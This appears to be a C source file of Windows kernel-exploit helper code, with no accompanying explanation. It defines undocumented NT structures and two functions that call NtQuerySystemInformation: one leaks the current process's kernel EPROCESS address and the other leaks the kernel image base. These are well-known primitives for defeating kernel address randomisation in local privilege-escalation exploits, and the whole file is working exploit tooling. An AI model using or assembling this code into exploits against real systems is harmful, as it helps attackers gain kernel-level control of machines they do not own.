#include "leak.h"

typedef struct _SYS_HANDLE_ENTRY_EX {
    PVOID      Object;
    ULONG_PTR  UniqueProcessId;
    ULONG_PTR  HandleValue;
    ULONG      GrantedAccess;
    USHORT     CreatorBackTraceIndex;
    USHORT     ObjectTypeIndex;
    ULONG      HandleAttributes;
    ULONG      Reserved;
} SYS_HANDLE_ENTRY_EX;

typedef struct _SYS_HANDLE_INFO_EX {
    ULONG_PTR            Count;
    ULONG_PTR            Reserved;
    SYS_HANDLE_ENTRY_EX  Handles[1];
} SYS_HANDLE_INFO_EX;

typedef struct _KMOD_ENTRY {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} KMOD_ENTRY;

typedef struct _KMOD_INFO {
    ULONG      Count;
    KMOD_ENTRY Modules[1];
} KMOD_INFO;

static fnNtQuerySystemInformation get_ntqsi(void)
{
    static fnNtQuerySystemInformation fn = NULL;
    if (!fn)
        fn = (fnNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation");
    return fn;
}

u64 leak_eprocess(void)
{
    fnNtQuerySystemInformation ntqsi;
    HANDLE hself;
    ULONG mypid, bufsz;
    PVOID buf;
    SYS_HANDLE_INFO_EX* info;
    ULONG_PTR i;
    u64 result = 0;

    ntqsi = get_ntqsi();
    if (!ntqsi) return 0;

    mypid = GetCurrentProcessId();
    hself = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, mypid);
    if (!hself) return 0;

    bufsz = 1 << 24;
    buf = VirtualAlloc(NULL, bufsz, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { CloseHandle(hself); return 0; }

    if (!NT_SUCCESS(ntqsi(64, buf, bufsz, NULL))) {
        VirtualFree(buf, 0, MEM_RELEASE);
        CloseHandle(hself);
        return 0;
    }

    info = (SYS_HANDLE_INFO_EX*)buf;
    for (i = 0; i < info->Count; i++) {
        if (info->Handles[i].UniqueProcessId == (ULONG_PTR)mypid &&
            info->Handles[i].HandleValue == (ULONG_PTR)hself) {
            result = (u64)info->Handles[i].Object;
            break;
        }
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    CloseHandle(hself);
    return result;
}

u64 leak_kernel_base(void)
{
    fnNtQuerySystemInformation ntqsi;
    ULONG bufsz;
    PVOID buf;
    KMOD_INFO* mods;
    u64 base = 0;

    ntqsi = get_ntqsi();
    if (!ntqsi) return 0;

    bufsz = 1 << 20;
    buf = VirtualAlloc(NULL, bufsz, MEM_COMMIT, PAGE_READWRITE);

    if (!NT_SUCCESS(ntqsi(11, buf, bufsz, NULL))) {
        VirtualFree(buf, 0, MEM_RELEASE);
        return 0;
    }

    mods = (KMOD_INFO*)buf;
    if (mods->Count > 0)
        base = (u64)mods->Modules[0].ImageBase;

    VirtualFree(buf, 0, MEM_RELEASE);
    return base;
}